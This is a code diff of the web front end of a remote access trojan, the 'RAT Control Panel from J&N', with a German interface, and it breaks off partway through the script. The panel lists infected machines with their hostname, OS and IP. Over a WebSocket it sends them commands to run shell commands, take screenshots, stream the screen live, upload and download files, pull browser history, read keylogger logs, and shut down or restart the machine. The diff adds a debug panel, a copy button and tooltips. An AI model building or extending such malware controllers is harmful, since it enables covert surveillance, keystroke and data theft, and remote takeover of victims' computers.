@@ -1,605 +1,653 @@
 <!DOCTYPE html>
 <html lang="de">
-  <head>
-    <meta charset="UTF-8" />
-    <title>RAT Control Panel from J&N</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-      html, body {
-        height: 100%;
-      }
-      body {
-        min-height: 100vh;
-        margin: 0;
-        padding: 0;
-        background: linear-gradient(135deg, #232526 0%, #414345 100%);
-        color: #e0e0e0;
-        font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: flex-start;
-      }
-      .container {
-        display: flex;
-        flex-direction: row;
-        gap: 32px;
-        margin: 40px 0 0 0;
-        width: 95vw;
-        max-width: 1600px;
-      }
-      .panel {
-        background: #23272f;
-        border-radius: 18px;
-        box-shadow: 0 8px 32px 0 rgba(31,38,135,0.25);
-        padding: 28px 24px;
-        min-width: 320px;
-        max-width: 420px;
-        flex: 1 1 350px;
-        display: flex;
-        flex-direction: column;
-        margin-bottom: 24px;
-      }
-      #client-panel {
-        max-width: 340px;
-        min-width: 220px;
-        flex: 0 0 260px;
-      }
-      #main-panel {
-        flex: 2 1 600px;
-        min-width: 400px;
-        max-width: 900px;
-      }
-      h2 {
-        margin-top: 0;
-        margin-bottom: 18px;
-        font-weight: 600;
-        font-size: 1.3em;
-        letter-spacing: 0.03em;
-        color: #8ecae6;
-        border-bottom: 1px solid #2c2f36;
-        padding-bottom: 8px;
-      }
-      #client-list {
-        list-style: none;
-        padding: 0;
-        margin: 0;
-        flex-grow: 1;
-        overflow-y: auto;
-        max-height: 60vh;
-      }
-      #client-list li {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        padding: 12px 10px;
-        border-radius: 8px;
-        cursor: pointer;
-        margin-bottom: 7px;
-        border: 1px solid transparent;
-        background: #23272f;
-        transition: background 0.15s, border 0.15s;
-        font-size: 1.05em;
-      }
-      #client-list li.selected, #client-list li:hover {
-        background: #2b3140;
-        border-color: #8ecae6;
-      }
-      .client-status-dot {
-        width: 10px;
-        height: 10px;
-        border-radius: 50%;
-        background: #43d17a;
-        margin-right: 4px;
-        box-shadow: 0 0 4px #43d17a88;
-      }
-      #output {
-        flex-grow: 1;
-        background: #181a20;
-        border: 1px solid #23272f;
-        border-radius: 8px;
-        padding: 12px;
-        font-family: "Fira Mono", "Consolas", "Courier New", monospace;
-        white-space: pre-wrap;
-        word-break: break-word;
-        overflow-y: auto;
-        margin-bottom: 14px;
-        min-height: 120px;
-        max-height: 260px;
-        font-size: 1.01em;
-      }
-      #controls {
-        display: flex;
-        gap: 10px;
-        flex-wrap: wrap;
-        margin-bottom: 10px;
-      }
-      .quick-btn, button {
-        background: linear-gradient(90deg, #3a506b 0%, #5bc0be 100%);
-        color: #fff;
-        border: none;
-        padding: 9px 16px;
-        border-radius: 7px;
-        font-size: 1em;
-        font-weight: 500;
-        cursor: pointer;
-        margin-right: 4px;
-        box-shadow: 0 2px 8px #0002;
-        transition: background 0.18s, box-shadow 0.18s;
-      }
-      .quick-btn:hover, button:hover {
-        background: linear-gradient(90deg, #5bc0be 0%, #3a506b 100%);
-        box-shadow: 0 4px 16px #0003;
-      }
-      input[type="text"] {
-        flex-grow: 1;
-        background: #23272f;
-        border: 1px solid #2c2f36;
-        color: #e0e0e0;
-        padding: 11px;
-        border-radius: 7px;
-        font-size: 1em;
-        outline: none;
-        transition: border 0.15s;
-      }
-      input[type="text"]:focus {
-        border-color: #8ecae6;
-      }
-      #upload-input {
-        display: none;
-      }
-      .log-entry {
-        padding: 2px 0;
-      }
-      .log-info { color: #43d17a; }
-      .log-error { color: #f44336; }
-      .log-cmd { color: #8ecae6; }
-      /* --- Live Screen --- */
-      #screen-canvas {
-        display: block;
-        margin: 0 auto;
-        background: #181818;
-        border-radius: 10px;
-        box-shadow: 0 2px 12px #0003;
-        border: 1px solid #23272f;
-        max-width: 100%;
-        max-height: 60vh;
-        transition: box-shadow 0.18s;
-      }
-      #screen-status {
-        margin-top: 7px;
-        color: #b9bbbe;
-        font-size: 1em;
-        text-align: center;
-        letter-spacing: 0.01em;
-      }
-      @media (max-width: 1100px) {
-        .container { flex-direction: column; align-items: stretch; }
-        #main-panel { max-width: 100%; }
-      }
-      @media (max-width: 700px) {
-        .container { flex-direction: column; gap: 10px; margin: 10px 0 0 0; }
-        .panel { padding: 12px 6px; min-width: unset; }
-        #main-panel { min-width: unset; }
-      }
-      /* --- Discord-Style Command Suggestion --- */
-      #command-suggest {
-        position: absolute;
-        background: #23272a;
-        color: #fff;
-        border-radius: 6px;
-        box-shadow: 0 4px 16px #000a;
-        min-width: 220px;
-        max-width: 350px;
-        z-index: 1000;
-        margin-top: 2px;
-        padding: 4px 0;
-        font-size: 1em;
-        display: none;
-      }
-      #command-suggest .suggest-item {
-        padding: 8px 16px;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-      }
-      #command-suggest .suggest-item.selected,
-      #command-suggest .suggest-item:hover {
-        background: #5865f2;
-        color: #fff;
-      }
-      #command-suggest .suggest-desc {
-        color: #b9bbbe;
-        font-size: 0.95em;
-        margin-left: 10px;
-        flex: 1;
-      }
-      @media (max-width: 900px) {
-        body {
-          flex-direction: column;
-          height: auto;
-        }
-        #client-panel {
-          width: 100%;
-          margin-bottom: 10px;
-        }
-        #main-panel {
-          width: 100%;
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <div class="container">
-      <div id="client-panel" class="panel">
-        <h2>Clients</h2>
-        <ul id="client-list"></ul>
+<head>
+  <meta charset="UTF-8" />
+  <title>RAT Control Panel from J&N</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    :root {
+      --bg: #232526;
+      --bg-panel: #23272f;
+      --text: #e0e0e0;
+      --accent: #8ecae6;
+      --accent2: #43d17a;
+      --danger: #f44336;
+      --shadow: 0 8px 32px 0 rgba(31,38,135,0.25);
+      --border: #2c2f36;
+      --panel-radius: 18px;
+      --transition: 0.18s;
+    }
+    html, body { height: 100%; }
+    body {
+      min-height: 100vh;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, var(--bg) 0%, #414345 100%);
+      color: var(--text);
+      font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      transition: background var(--transition), color var(--transition);
+    }
+    .container {
+      display: flex;
+      flex-direction: row;
+      gap: 32px;
+      margin: 40px 0 0 0;
+      width: 95vw;
+      max-width: 1600px;
+    }
+    .panel {
+      background: var(--bg-panel);
+      border-radius: var(--panel-radius);
+      box-shadow: var(--shadow);
+      padding: 28px 24px;
+      min-width: 320px;
+      max-width: 420px;
+      flex: 1 1 350px;
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 24px;
+      transition: background var(--transition), color var(--transition);
+    }
+    #client-panel {
+      max-width: 340px;
+      min-width: 220px;
+      flex: 0 0 260px;
+    }
+    #main-panel {
+      flex: 2 1 600px;
+      min-width: 400px;
+      max-width: 900px;
+    }
+    h2 {
+      margin-top: 0;
+      margin-bottom: 18px;
+      font-weight: 600;
+      font-size: 1.3em;
+      letter-spacing: 0.03em;
+      color: var(--accent);
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 8px;
+    }
+    #client-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      flex-grow: 1;
+      overflow-y: auto;
+      max-height: 60vh;
+    }
+    #client-list li {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 10px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-bottom: 7px;
+      border: 1px solid transparent;
+      background: var(--bg-panel);
+      transition: background var(--transition), border var(--transition);
+      font-size: 1.05em;
+      position: relative;
+    }
+    #client-list li.selected, #client-list li:hover {
+      background: #2b3140;
+      border-color: var(--accent);
+    }
+    .client-status-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--accent2);
+      margin-right: 4px;
+      box-shadow: 0 0 4px #43d17a88;
+    }
+    .client-os {
+      width: 18px;
+      height: 18px;
+      margin-right: 6px;
+      opacity: 0.8;
+    }
+    .client-tooltip {
+      display: none;
+      position: absolute;
+      left: 110%;
+      top: 0;
+      background: #23272a;
+      color: #fff;
+      border-radius: 7px;
+      padding: 8px 14px;
+      font-size: 0.98em;
+      box-shadow: 0 4px 16px #000a;
+      z-index: 10;
+      min-width: 180px;
+      max-width: 320px;
+      pointer-events: none;
+    }
+    #client-list li:hover .client-tooltip {
+      display: block;
+    }
+    #output {
+      flex-grow: 1;
+      background: #181a20;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px;
+      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
+      white-space: pre-wrap;
+      word-break: break-word;
+      overflow-y: auto;
+      margin-bottom: 14px;
+      min-height: 120px;
+      max-height: 260px;
+      font-size: 1.01em;
+      position: relative;
+    }
+    #copy-output {
+      position: absolute;
+      top: 8px;
+      right: 12px;
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      padding: 4px 10px;
+      font-size: 0.95em;
+      cursor: pointer;
+      opacity: 0.7;
+      transition: opacity 0.15s;
+    }
+    #copy-output:hover { opacity: 1; }
+    #controls {
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+      margin-bottom: 10px;
+      align-items: center;
+    }
+    #send-button {
+      background: linear-gradient(90deg, #3a506b 0%, #5bc0be 100%);
+      color: #fff;
+      border: none;
+      padding: 9px 16px;
+      border-radius: 7px;
+      font-size: 1em;
+      font-weight: 500;
+      cursor: pointer;
+      margin-left: 8px;
+      box-shadow: 0 2px 8px #0002;
+      transition: background var(--transition), box-shadow var(--transition);
+    }
+    #send-button:hover {
+      background: linear-gradient(90deg, #5bc0be 0%, #3a506b 100%);
+      box-shadow: 0 4px 16px #0003;
+    }
+    input[type="text"] {
+      flex-grow: 1;
+      background: var(--bg-panel);
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 11px;
+      border-radius: 7px;
+      font-size: 1em;
+      outline: none;
+      transition: border var(--transition), background var(--transition), color var(--transition);
+    }
+    input[type="text"]:focus {
+      border-color: var(--accent);
+    }
+    #upload-input {
+      display: none;
+    }
+    .log-entry {
+      padding: 2px 0;
+    }
+    .log-info { color: var(--accent2); }
+    .log-error { color: var(--danger); }
+    .log-cmd { color: var(--accent); }
+    /* --- Live Screen --- */
+    #screen-canvas {
+      display: block;
+      margin: 0 auto;
+      background: #181818;
+      border-radius: 10px;
+      box-shadow: 0 2px 12px #0003;
+      border: 1px solid var(--border);
+      max-width: 100%;
+      max-height: 60vh;
+      transition: box-shadow var(--transition);
+      cursor: zoom-in;
+      margin-top: 18px;
+    }
+    #screen-status {
+      margin-top: 7px;
+      color: #b9bbbe;
+      font-size: 1em;
+      text-align: center;
+      letter-spacing: 0.01em;
+    }
+    /* --- Debug Panel --- */
+    #debug-panel {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100vw;
+      max-height: 30vh;
+      background: #181a20f0;
+      color: #fff;
+      font-family: "Fira Mono", monospace;
+      font-size: 0.98em;
+      border-top: 2px solid #8ecae6;
+      z-index: 9999;
+      overflow-y: auto;
+      padding: 10px 18px 10px 18px;
+      box-sizing: border-box;
+      transition: max-height 0.2s;
+    }
+    #debug-toggle {
+      position: fixed;
+      bottom: 32px;
+      right: 32px;
+      background: #23272f;
+      color: #8ecae6;
+      border: 2px solid #8ecae6;
+      border-radius: 50%;
+      width: 44px;
+      height: 44px;
+      font-size: 1.5em;
+      cursor: pointer;
+      z-index: 10000;
+      box-shadow: 0 2px 12px #0005;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.18s, color 0.18s;
+    }
+    #debug-toggle:hover {
+      background: #8ecae6;
+      color: #23272f;
+    }
+    .debug-log-entry {
+      margin-bottom: 2px;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .debug-log-error { color: #f44336; }
+    .debug-log-info { color: #43d17a; }
+    .debug-log-warn { color: #ffb300; }
+    @media (max-width: 1100px) {
+      .container { flex-direction: column; align-items: stretch; }
+      #main-panel { max-width: 100%; }
+    }
+    @media (max-width: 700px) {
+      .container { flex-direction: column; gap: 10px; margin: 10px 0 0 0; }
+      .panel { padding: 12px 6px; min-width: unset; }
+      #main-panel { min-width: unset; }
+    }
+    /* --- Discord-Style Command Suggestion --- */
+    #command-suggest {
+      position: absolute;
+      background: #23272a;
+      color: #fff;
+      border-radius: 6px;
+      box-shadow: 0 4px 16px #000a;
+      min-width: 220px;
+      max-width: 350px;
+      z-index: 1000;
+      margin-top: 2px;
+      padding: 4px 0;
+      font-size: 1em;
+      display: none;
+    }
+    #command-suggest .suggest-item {
+      padding: 8px 16px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+    }
+    #command-suggest .suggest-item.selected,
+    #command-suggest .suggest-item:hover {
+      background: #5865f2;
+      color: #fff;
+    }
+    #command-suggest .suggest-desc {
+      color: #b9bbbe;
+      font-size: 0.95em;
+      margin-left: 10px;
+      flex: 1;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="client-panel" class="panel">
+      <h2>Clients</h2>
+      <ul id="client-list"></ul>
+    </div>
+    <div id="main-panel" class="panel">
+      <div id="output">
+        <button id="copy-output" title="Kopieren">📋</button>
       </div>
-      <div id="main-panel" class="panel">
-        <div id="output"></div>
-        <div id="controls" style="position:relative;">
-          <input
-            type="text"
-            id="command-input"
-            placeholder="Befehle: /exec, /screenshot, /download, /history, /keylogger, /ls, /systeminfo"
-            autocomplete="off"
-          />
-          <div id="command-suggest"></div>
-          <button id="send-button">Senden</button>
-          <button class="quick-btn" id="btn-systeminfo" title="Systeminfo">Systeminfo</button>
-          <button class="quick-btn" id="btn-ls" title="Verzeichnis auflisten">ls</button>
-          <button class="quick-btn" id="btn-upload" title="Datei hochladen">Upload</button>
-          <button class="quick-btn" id="btn-shutdown" title="Herunterfahren">Shutdown</button>
-          <button class="quick-btn" id="btn-restart" title="Neustart">Restart</button>
-          <button class="quick-btn" id="btn-screenstream-start" title="Live-Screen starten">Screenstream Start</button>
-          <button class="quick-btn" id="btn-screenstream-stop" title="Live-Screen stoppen">Screenstream Stop</button>
-          <input type="file" id="upload-input" />
-        </div>
-        <div class="panel" style="background:#23272f;box-shadow:none;margin:0;padding:18px 8px 8px 8px;">
-          <h2 style="margin-bottom:10px;">Live Screen</h2>
-          <canvas id="screen-canvas" tabindex="0"></canvas>
-          <div id="screen-status"></div>
-        </div>
+      <div id="controls" style="position:relative;">
+        <input
+          type="text"
+          id="command-input"
+          placeholder="Befehle: /exec, /screenshot, /download, /history, /keylogger, /ls, /systeminfo"
+          autocomplete="off"
+        />
+        <div id="command-suggest"></div>
+        <button id="send-button">Senden</button>
+        <input type="file" id="upload-input" />
+      </div>
+      <div id="live-screen-area" style="display:none;">
+        <canvas id="screen-canvas" tabindex="0"></canvas>
+        <div id="screen-status"></div>
       </div>
     </div>
-    <script>
-      const ws = new WebSocket(`wss://${window.location.host}/ws`);
-      const clientList = document.getElementById("client-list");
-      const output = document.getElementById("output");
-      const commandInput = document.getElementById("command-input");
-      const sendButton = document.getElementById("send-button");
-      const uploadInput = document.getElementById("upload-input");
-      const btnSysteminfo = document.getElementById("btn-systeminfo");
-      const btnLs = document.getElementById("btn-ls");
-      const btnUpload = document.getElementById("btn-upload");
-      const btnShutdown = document.getElementById("btn-shutdown");
-      const btnRestart = document.getElementById("btn-restart");
-      const btnScreenStart = document.getElementById("btn-screenstream-start");
-      const btnScreenStop = document.getElementById("btn-screenstream-stop");
-      const screenCanvas = document.getElementById('screen-canvas');
-      const screenStatus = document.getElementById('screen-status');
+  </div>
+  <button id="debug-toggle" title="Debug anzeigen/verstecken">🐞</button>
+  <div id="debug-panel"></div>
+  <script>
+    // --- Debug Panel ---
+    const debugPanel = document.getElementById('debug-panel');
+    const debugToggle = document.getElementById('debug-toggle');
+    let debugEnabled = false;
+    debugToggle.onclick = () => {
+      debugEnabled = !debugEnabled;
+      debugPanel.style.display = debugEnabled ? "block" : "none";
+    };
+    function debugLog(msg, type="info") {
+      if (!debugPanel) return;
+      const div = document.createElement("div");
+      div.className = "debug-log-entry debug-log-" + type;
+      div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+      debugPanel.appendChild(div);
+      debugPanel.scrollTop = debugPanel.scrollHeight;
+    }
 
-      let selectedClientId = null;
-      let selectedClient = null;
+    // --- Output Copy ---
+    const output = document.getElementById("output");
+    const copyBtn = document.getElementById("copy-output");
+    copyBtn.onclick = () => {
+      const text = output.innerText.replace(/^📋/, '').trim();
+      navigator.clipboard.writeText(text);
+      copyBtn.textContent = "✅";
+      setTimeout(() => (copyBtn.textContent = "📋"), 1200);
+    };
 
-      // --- UI Hilfsfunktionen ---
-      function log(message, type = "info") {
-        const entry = document.createElement("div");
-        entry.className = `log-entry log-${type}`;
-        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-        output.appendChild(entry);
-        output.scrollTop = output.scrollHeight;
-      }
+    // --- Client-Listenfunktionen ---
+    function osIcon(os) {
+      if (!os) return "";
+      if (os.toLowerCase().includes("windows")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/windows8/windows8-original.svg" alt="Windows">';
+      if (os.toLowerCase().includes("linux")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" alt="Linux">';
+      if (os.toLowerCase().includes("darwin") || os.toLowerCase().includes("mac")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/apple/apple-original.svg" alt="macOS">';
+      return "";
+    }
+    function createClientListItem(client) {
+      const li = document.createElement("li");
+      li.innerHTML = `<span class="client-status-dot"></span>
+        ${osIcon(client.os)}
+        <span>${client.hostname || "Unbekannt"}</span>
+        <span style="margin-left:auto;font-size:0.97em;color:#b9bbbe;">${client.ip || client.address[0]}</span>
+        <span class="client-tooltip">
+          <b>Hostname:</b> ${client.hostname || "?"}<br>
+          <b>OS:</b> ${client.os || "?"}<br>
+          <b>IP:</b> ${client.ip || client.address[0]}
+        </span>`;
+      li.dataset.clientId = client.id;
+      if (client.id === selectedClientId) li.classList.add("selected");
+      li.addEventListener("click", () => selectClient(client.id, client));
+      return li;
+    }
+    function renderClientList(clients) {
+      clientList.innerHTML = "";
+      clients.forEach((client) => {
+        const li = createClientListItem(client);
+        clientList.appendChild(li);
+      });
+    }
+    function selectClient(id, clientObj) {
+      selectedClientId = id;
+      selectedClient = id;
+      document.querySelectorAll("#client-list li").forEach((el) => el.classList.remove("selected"));
+      const li = clientList.querySelector(`li[data-client-id='${id}']`);
+      if (li) li.classList.add("selected");
+      log(`Client ${clientObj?.hostname || id} ausgewählt.`, "cmd");
+      screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
+      screenStatus.textContent = '';
+    }
 
-      function triggerDownload(filename, base64Data) {
-        const link = document.createElement("a");
-        link.href = `data:application/octet-stream;base64,${base64Data}`;
-        link.download = filename;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      }
+    // --- Output Logging mit Syntax Highlight ---
+    function log(message, type = "info") {
+      const entry = document.createElement("div");
+      entry.className = `log-entry log-${type}`;
+      entry.innerHTML = highlightSyntax(`[${new Date().toLocaleTimeString()}] ${message}`);
+      output.appendChild(entry);
+      output.scrollTop = output.scrollHeight;
+      debugLog(message, type);
+    }
+    function highlightSyntax(text) {
+      return text
+        .replace(/(error|fehler)/gi, '<span style="color:#f44336;font-weight:bold">$1</span>')
+        .replace(/(\$ |PS |C:\\\\|C:\/)/g, '<span style="color:#8ecae6;font-weight:bold">$1</span>');
+    }
 
-      // --- Client-Listenfunktionen ---
-      function createClientListItem(client) {
-        const li = document.createElement("li");
-        li.innerHTML = `<span class="client-status-dot"></span>
-          <span>${client.hostname || "Unbekannt"}</span>
-          <span style="margin-left:auto;font-size:0.97em;color:#b9bbbe;">${client.ip || client.address[0]}</span>`;
-        li.dataset.clientId = client.id;
-        li.title = `Hostname: ${client.hostname || "?"}\nOS: ${client.os || "?"}\nIP: ${client.ip || client.address[0]}`;
-        if (client.id === selectedClientId) li.classList.add("selected");
-        li.addEventListener("click", () => selectClient(client.id, client));
-        return li;
-      }
-
-      function renderClientList(clients) {
-        clientList.innerHTML = "";
-        clients.forEach((client) => {
-          const li = createClientListItem(client);
-          clientList.appendChild(li);
-        });
-      }
-
-      function selectClient(id, clientObj) {
-        selectedClientId = id;
-        selectedClient = id;
-        document.querySelectorAll("#client-list li").forEach((el) => el.classList.remove("selected"));
-        const li = clientList.querySelector(`li[data-client-id='${id}']`);
-        if (li) li.classList.add("selected");
-        log(`Client ${clientObj?.hostname || id} ausgewählt.`, "cmd");
-        screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
-        screenStatus.textContent = '';
-      }
-
-      // --- Discord-Style Command Suggestion ---
-      const commandInput = document.getElementById("command-input");
-      const commandSuggest = document.getElementById("command-suggest");
-
-      // Liste der verfügbaren Befehle
-      const COMMANDS = [
-        { cmd: "/exec", desc: "Führe einen Shell-Befehl aus" },
-        { cmd: "/screenshot", desc: "Screenshot des Bildschirms" },
-        { cmd: "/download", desc: "Datei herunterladen (Pfad angeben)" },
-        { cmd: "/upload", desc: "Datei zum Client hochladen" },
-        { cmd: "/history", desc: "Browserverlauf anzeigen" },
-        { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
-        { cmd: "/ls", desc: "Verzeichnis auflisten" },
-        { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
-        { cmd: "/shutdown", desc: "Client herunterfahren" },
-        { cmd: "/restart", desc: "Client neustarten" },
-        { cmd: "/screenstream_start", desc: "Live-Screen starten" },
-        { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" }
-      ];
-
-      let suggestActive = false;
-      let suggestItems = [];
-      let suggestIndex = 0;
-
-      function showSuggest(filtered) {
-        if (!filtered.length) {
-          commandSuggest.style.display = "none";
-          suggestActive = false;
-          return;
+    // --- Output History (Pfeiltasten) ---
+    let cmdHistory = [], cmdHistoryIdx = -1;
+    commandInput.addEventListener("keydown", (e) => {
+      if (e.key === "ArrowUp") {
+        if (cmdHistory.length && cmdHistoryIdx > 0) {
+          cmdHistoryIdx--;
+          commandInput.value = cmdHistory[cmdHistoryIdx];
+          e.preventDefault();
         }
-        commandSuggest.innerHTML = "";
-        filtered.forEach((item, idx) => {
-          const div = document.createElement("div");
-          div.className = "suggest-item" + (idx === suggestIndex ? " selected" : "");
-          div.innerHTML = `<span>${item.cmd}</span><span class="suggest-desc">${item.desc}</span>`;
-          div.addEventListener("mousedown", (e) => {
-            e.preventDefault();
-            selectSuggest(idx, filtered);
-          });
-          commandSuggest.appendChild(div);
-        });
-        // Positionierung
-        const rect = commandInput.getBoundingClientRect();
-        commandSuggest.style.left = commandInput.offsetLeft + "px";
-        commandSuggest.style.top = (commandInput.offsetTop + commandInput.offsetHeight) + "px";
-        commandSuggest.style.width = commandInput.offsetWidth + "px";
-        commandSuggest.style.display = "block";
-        suggestActive = true;
+      } else if (e.key === "ArrowDown") {
+        if (cmdHistory.length && cmdHistoryIdx < cmdHistory.length - 1) {
+          cmdHistoryIdx++;
+          commandInput.value = cmdHistory[cmdHistoryIdx];
+          e.preventDefault();
+        } else if (cmdHistoryIdx === cmdHistory.length - 1) {
+          commandInput.value = "";
+          cmdHistoryIdx = cmdHistory.length;
+        }
       }
+    });
 
-      function hideSuggest() {
+    // --- Discord-Style Command Suggestion ---
+    const commandSuggest = document.getElementById("command-suggest");
+    const COMMANDS = [
+      { cmd: "/exec", desc: "Führe einen Shell-Befehl aus" },
+      { cmd: "/screenshot", desc: "Screenshot des Bildschirms" },
+      { cmd: "/download", desc: "Datei herunterladen (Pfad angeben)" },
+      { cmd: "/upload", desc: "Datei zum Client hochladen" },
+      { cmd: "/history", desc: "Browserverlauf anzeigen" },
+      { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
+      { cmd: "/ls", desc: "Verzeichnis auflisten" },
+      { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
+      { cmd: "/shutdown", desc: "Client herunterfahren" },
+      { cmd: "/restart", desc: "Client neustarten" },
+      { cmd: "/screenstream_start", desc: "Live-Screen starten" },
+      { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" }
+    ];
+    let suggestActive = false;
+    let suggestItems = [];
+    let suggestIndex = 0;
+    function showSuggest(filtered) {
+      if (!filtered.length) {
         commandSuggest.style.display = "none";
         suggestActive = false;
+        return;
       }
-
-      function selectSuggest(idx, filtered) {
-        const cmd = filtered[idx].cmd;
-        commandInput.value = cmd + " ";
-        hideSuggest();
-        commandInput.focus();
-      }
-
-      commandInput.addEventListener("input", (e) => {
-        const val = commandInput.value;
-        if (val.startsWith("/")) {
-          const filtered = COMMANDS.filter(c =>
-            c.cmd.startsWith(val) || c.cmd.replace("/", "").startsWith(val.replace("/", ""))
-          );
-          suggestItems = filtered;
-          suggestIndex = 0;
-          showSuggest(filtered);
-        } else {
-          hideSuggest();
-        }
-      });
-
-      commandInput.addEventListener("keydown", (e) => {
-        if (!suggestActive) return;
-        if (e.key === "ArrowDown") {
-          suggestIndex = (suggestIndex + 1) % suggestItems.length;
-          showSuggest(suggestItems);
+      commandSuggest.innerHTML = "";
+      filtered.forEach((item, idx) => {
+        const div = document.createElement("div");
+        div.className = "suggest-item" + (idx === suggestIndex ? " selected" : "");
+        div.innerHTML = `<span>${item.cmd}</span><span class="suggest-desc">${item.desc}</span>`;
+        div.addEventListener("mousedown", (e) => {
           e.preventDefault();
-        } else if (e.key === "ArrowUp") {
-          suggestIndex = (suggestIndex - 1 + suggestItems.length) % suggestItems.length;
-          showSuggest(suggestItems);
-          e.preventDefault();
-        } else if (e.key === "Enter") {
-          if (suggestActive && suggestItems.length) {
-            selectSuggest(suggestIndex, suggestItems);
-            e.preventDefault();
-          }
-        } else if (e.key === "Escape") {
-          hideSuggest();
-        }
+          selectSuggest(idx, filtered);
+        });
+        commandSuggest.appendChild(div);
       });
-
-      commandInput.addEventListener("blur", () => {
-        setTimeout(hideSuggest, 100); // Verzögert, damit Klick auf Vorschlag funktioniert
-      });
-
-      // --- Mapping für /-Befehle zu echten Aktionen ---
-      function parseSlashCommand(val) {
-        if (!val.startsWith("/")) return null;
-        const [cmd, ...args] = val.trim().split(" ");
-        switch (cmd) {
-          case "/exec":
-            return { action: "exec", command: args.join(" ") };
-          case "/screenshot":
-            return { action: "screenshot" };
-          case "/download":
-            return { action: "download", path: args.join(" ") };
-          case "/upload":
-            // handled by upload button
-            return null;
-          case "/history":
-            return { action: "history", limit: parseInt(args[0]) || 20 };
-          case "/keylogger":
-            return { action: "keylogger", count: parseInt(args[0]) || 50 };
-          case "/ls":
-            return { action: "ls", path: args.join(" ") || "." };
-          case "/systeminfo":
-            return { action: "systeminfo" };
-          case "/shutdown":
-            return { action: "shutdown" };
-          case "/restart":
-            return { action: "restart" };
-          case "/screenstream_start":
-            return { action: "screenstream_start" };
-          case "/screenstream_stop":
-            return { action: "screenstream_stop" };
-          default:
-            return null;
-        }
-      }
-
-      // --- Befehl senden (angepasst für /-Befehle) ---
-      function sendCommand(customPayload = null) {
-        if (!selectedClientId) {
-          log("Fehler: Kein Client ausgewählt.", "error");
-          return;
-        }
-        let payload;
-        if (customPayload) {
-          payload = { target_id: selectedClientId, ...customPayload };
-        } else {
-          const commandText = commandInput.value.trim();
-          // Discord-Style: /-Befehle parsen
-          let slashPayload = parseSlashCommand(commandText);
-          if (slashPayload) {
-            payload = { target_id: selectedClientId, ...slashPayload };
-          } else {
-            if (!commandText) return;
-            const parts = commandText.split(" ");
-            const action = parts[0].toLowerCase();
-            const argument = parts.slice(1).join(" ");
-            payload = {
-              target_id: selectedClientId,
-              action: action,
-            };
-            switch (action) {
-              case "exec":
-                payload.command = argument;
-                break;
-              case "download":
-                payload.path = argument;
-                break;
-              case "history":
-                payload.limit = parseInt(argument) || 20;
-                break;
-              case "keylogger":
-                payload.count = parseInt(argument) || 50;
-                break;
-              case "ls":
-                payload.path = argument || ".";
-                break;
-              case "screenshot":
-              case "systeminfo":
-              case "shutdown":
-              case "restart":
-                break;
-              default:
-                log(
-                  "Unbekannter Befehl. Verfügbar: exec, screenshot, download, history, keylogger, ls, systeminfo, shutdown, restart",
-                  "error"
-                );
-                return;
-            }
-          }
-        }
-        ws.send(JSON.stringify(payload));
-        log(
-          `Befehl gesendet: ${payload.action}${
-            payload.command ? " " + payload.command : payload.path ? " " + payload.path : ""
-          }`,
-          "cmd"
+      const rect = commandInput.getBoundingClientRect();
+      commandSuggest.style.left = commandInput.offsetLeft + "px";
+      commandSuggest.style.top = (commandInput.offsetTop + commandInput.offsetHeight) + "px";
+      commandSuggest.style.width = commandInput.offsetWidth + "px";
+      commandSuggest.style.display = "block";
+      suggestActive = true;
+    }
+    function hideSuggest() {
+      commandSuggest.style.display = "none";
+      suggestActive = false;
+    }
+    function selectSuggest(idx, filtered) {
+      const cmd = filtered[idx].cmd;
+      commandInput.value = cmd + " ";
+      hideSuggest();
+      commandInput.focus();
+    }
+    commandInput.addEventListener("input", (e) => {
+      const val = commandInput.value;
+      if (val.startsWith("/")) {
+        const filtered = COMMANDS.filter(c =>
+          c.cmd.startsWith(val) || c.cmd.replace("/", "").startsWith(val.replace("/", ""))
         );
-        commandInput.value = "";
+        suggestItems = filtered;
+        suggestIndex = 0;
+        showSuggest(filtered);
+      } else {
         hideSuggest();
       }
-
-      // --- Event-Handler ---
-      sendButton.addEventListener("click", sendCommand);
-      commandInput.addEventListener("keydown", (e) => {
